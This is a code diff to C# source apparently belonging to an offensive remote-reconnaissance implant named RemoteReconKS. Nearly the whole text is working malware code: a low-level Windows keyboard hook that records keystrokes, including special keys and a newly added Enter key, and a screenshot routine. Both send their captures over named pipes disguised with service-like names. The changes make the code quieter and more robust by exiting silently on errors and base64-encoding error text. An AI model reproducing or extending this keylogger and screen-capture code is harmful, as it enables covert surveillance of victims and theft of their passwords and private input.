@@ -24,16 +24,24 @@ namespace RemoteReconKS
         {
             if (capability.ToLower() == "screenshot")
             {
-                server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
-                server.WaitForConnection();
-                sw = new StreamWriter(server);
+                try
+                {
+                    server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
+                    server.WaitForConnection();
+                    sw = new StreamWriter(server);
 
-                //byte[] image = screenshot();
-                sw.WriteLine(screenshot());
-                Thread.Sleep(5000);
-                sw.Flush();
+                    //byte[] image = screenshot();
+                    sw.WriteLine(screenshot());
+                    Thread.Sleep(5000);
+                    sw.Flush();
 
-                server.Close();
+                    server.Close();
+                }
+                catch (Exception)
+                {
+                    Application.ExitThread();
+                }
+                
             }
             else if(capability.ToLower() == "keylog")
             {
@@ -61,7 +69,7 @@ namespace RemoteReconKS
             }
             catch (Exception e)
             {
-                return e.ToString();
+                return Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
             }
         }
 
@@ -69,12 +77,7 @@ namespace RemoteReconKS
         {
             //Start a background thread for the keylogger
             WinApi._hookID = SetHook(WinApi._proc);
-            /*Thread t = new Thread(() =>
-            {
-                LogKeyStrokes();
-            });
-            t.IsBackground = true;
-            t.Start();*/
+            
             try
             {
                 client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.Out);
@@ -91,39 +94,6 @@ namespace RemoteReconKS
             }
             
         }
-
-        /*
-        private static void LogKeyStrokes()
-        {
-            NamedPipeClientStream client = new NamedPipeClientStream(".","svc_kl", PipeDirection.InOut);
-            client.Connect(5000);
-            //sw = new StreamWriter(client);
-            while (client.IsConnected)
-            {
-                try
-                {
-                    byte[] klBytes = Encoding.ASCII.GetBytes(keylogoutput.ToString());
-                    client.Write(klBytes, 0, klBytes.Length);
-#if DEBUG
-                    File.AppendAllText("C:\\Users\\dso\\Desktop\\keylog.log", keylogoutput.ToString() + "\r\n");
-#endif
-                    keylogoutput.Remove(0, keylogoutput.Length);
-                }
-                catch (Exception e)
-                {
-#if DEBUG
-                    File.AppendAllText("C:\\Users\\dso\\Desktop\\keylog.log", e.ToString() + "\r\n");
-#endif
-                }
-                
-                
-                Thread.Sleep(1000);
-                client.Flush();
-            }
-            sw.Close();
-            client.Close();
-            client.Dispose();
-        }*/
 
         //Keyboard hook
         private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
@@ -152,32 +122,30 @@ namespace RemoteReconKS
                     case Keys.Space:
                         key = Encoding.UTF8.GetBytes(" ");
                         client.Write(key, 0, key.Length);
-                        //client.Flush();
                         break;
                     case Keys.RControlKey:
                         key = Encoding.UTF8.GetBytes("[RCNTRL]");
                         client.Write(key, 0, key.Length);
-                        //client.Flush();
                         break;
                     case Keys.LControlKey:
                         key = Encoding.UTF8.GetBytes("[LCNTRL]");
                         client.Write(key, 0, key.Length);
-                        //client.Flush();
                         break;
                     case Keys.LWin:
                         key = Encoding.UTF8.GetBytes("[WIN]");
                         client.Write(key, 0, key.Length);
-                        //client.Flush();
                         break;
                     case Keys.Tab:
                         key = Encoding.UTF8.GetBytes("[TAB]");
                         client.Write(key, 0, key.Length);
-                        //client.Flush();
                         break;
                     case Keys.Back:
                         key = Encoding.UTF8.GetBytes("[BACKSPACE]");
                         client.Write(key, 0, key.Length);
-                        //client.Flush();
+                        break;
+                    case Keys.Enter:
+                        key = Encoding.UTF8.GetBytes("[ENTER]");
+                        client.Write(key, 0, key.Length);
                         break;
                     default:
                         break;
@@ -200,7 +168,6 @@ namespace RemoteReconKS
 
                     var s = new StringBuilder(256);
                     var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
-                    //keylogoutput.Append(s.ToString());
                     if (client.IsConnected)
                     {
                         key = Encoding.UTF8.GetBytes(s.ToString());
